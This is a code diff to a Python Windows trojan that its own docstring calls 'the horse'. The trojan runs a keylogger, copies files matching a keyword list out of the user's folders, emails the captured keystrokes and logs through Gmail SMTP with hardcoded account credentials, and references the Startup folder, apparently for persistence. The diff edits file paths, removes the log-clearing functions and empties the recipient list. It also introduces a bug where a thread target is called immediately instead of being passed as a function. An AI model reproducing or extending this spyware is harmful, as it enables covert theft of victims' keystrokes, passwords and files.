@@ -42,7 +42,6 @@ class Log(object):
             email_controller.sendMail(Constants.EMAIL_DESTINATION_LIST, "Log File Attached",
                                       "Sent from your friend...", Constants.LOG_FILE_LOCATION)
             email_controller.stop_server()
-            self.clearLog()
 
     def logSizeUnder1MB(self, location):
         """Returns true if the size of the log file is less than 1MB"""
@@ -72,11 +71,6 @@ class KeyLogger(object):
         f.writelines(message)
         f.close()
 
-    def clearkeystrokelog(self):
-        f = open(Constants.KEY_STROKES_LOG, Constants.OVERWRITE_MODE)
-        f.writelines("")
-        f.close()
-
     def startKeyLogger(self):
         log_message = "Started keylogger\n"
         self.log_controller.writeMessage(log_message)
@@ -97,13 +91,14 @@ class KeyLogger(object):
                 email_controller.sendMail(Constants.EMAIL_DESTINATION_LIST, "KeyLog File Attached",
                                           "Sent from your friend...", Constants.KEY_STROKES_LOG)
                 email_controller.stop_server()
-                self.clearkeystrokelog()
+
             except:
                 pass
 
     def stop_to_send_keylog(self):
         time.sleep(2592000) #Wait for a month
         self.send_keylog_flag = False
+
 
     def OnKeyboardEvent(self, event):
         # print ("The message name is:",event.MessageName)
@@ -125,6 +120,7 @@ class KeyLogger(object):
         # self.log_controller.writeMessage(log_message)
         # ctypes.windll.user32.PostQuitMessage(0)
         # win32api.PostThreadMessage(self.running_keylogger_thread_id, win32con.WM_QUIT, 0, 0)
+        
 
     def isChromeRunning(self):
         log_message = """Checked if Chrome was running\n"""
@@ -142,32 +138,33 @@ class KeyLogger(object):
         return False
 
 
-class Constants(object):
+class Constants:
     """Contains the Constants for the horse"""
     USER_NAME = os.getlogin()
-    USER_PATH = r'C:\Users' + "\\" + USER_NAME
-    SEARCH_ROOT = USER_PATH + r"\Documents"
+    USER_PATH = os.path.join(r"C:\Users", USER_NAME)
+    SEARCH_ROOT = USER_PATH
     ROOT = r"C:"
-    LOG_FILE_LOCATION = os.path.join(USER_PATH, r"Documents\tlog.txt")
+    LOG_FILE_LOCATION = os.path.join(USER_PATH, r"Desktop\trojan_log.txt")
     APPEND_MODE = 'a'
     OVERWRITE_MODE = 'w'
     READ_MODE = 'r'
     MAX_LOG_SIZE = 1000000
     WORD_LIST = ["shimon", "with"]
-    DESTINATION_FOLDER_PATH = os.path.join(USER_PATH, r"\Documents\test")
+    FILE_LIST_PATH = r"C:\Users\nassan\Desktop\file_list.txt"
+    DESTINATION_FOLDER_PATH = os.path.join(USER_PATH, r"Desktop\Horse\madaf")
     CHROME_PROCESS_NAME = "chrome.exe"
     ENDLINE = "\n"
-    KEY_STROKES_LOG = os.path.join(USER_PATH, r"Documents\kslog.txt")
+    KEY_STROKES_LOG = os.path.join(USER_PATH, r"Desktop\key_strokes_log.txt")
     EMAIL_SERVER_NAME = 'smtp.gmail.com:587'
     EMAIL_SOURCE = "trojanhorsepy@gmail.com"
-    EMAIL_DESTINATION_LIST = ['nassanpaul@gmail.com', 'shimonste@gmail.com']
+    EMAIL_DESTINATION_LIST = []
     EMAIL_CC_LIST = []
-    EMAIL_SUBJECT_HEADER = "t..."
+    EMAIL_SUBJECT_HEADER = ""
     EMAIL_LOGIN = "trojanhorsepy@gmail.com"
     EMAIL_PASSWORD = "nattanshimon"
     STARTUP_LOCATION = USER_PATH + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
     FIRST_TIME = "FIRSTtime.txt"
-    FIRST_TIME_DIR = os.path.join(USER_PATH, r"\Documents\tks")
+    FIRST_TIME_DIR = r"C:\Users\shimon\Desktop\Horse"
     FIRST_TIME_ALL_DIR = os.path.join(FIRST_TIME_DIR, FIRST_TIME)
     SELF_lOCATION = os.path.abspath(__file__)
     PYTHON_DEFAULT_LOCATION = ""
@@ -308,7 +305,6 @@ class OSmanipulation(object):
                                     pass
             except:
                 pass                
-
     def stop_copying(self):
         time.sleep(2592000)
         self.continue_checking_flag = False
@@ -353,7 +349,6 @@ class Email(object):
 
 
 class AttachMail():
-
     def start_server(self):
         self.mailServer = smtplib.SMTP("smtp.gmail.com", 587)
         #mailServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)   # didn't work for me
@@ -442,7 +437,7 @@ def kickOff():
 
     # Define the threads for the keylogger
     searching_thread = threading.Thread(target=file_copy.Copy_interesting_files)
-    stop_searching_thread = threading.Thread(target=file_copy.stop_copying)
+    stop_searching_thread = threading.Thread(target=file_copy.stop_copying())
 
     # Create the email object
     attachmail = AttachMail()
@@ -457,11 +452,11 @@ def kickOff():
     keylogger_mail_thread.start()
     stop_keylogger_mail_thread.start()
 
-    Start the threads for file copy
+    # Start the threads for file copy
     searching_thread.start()
     stop_searching_thread.start()
 
-    Start the threads for emailing
+    # Start the threads for emailing
     email_thread.start()
 
 
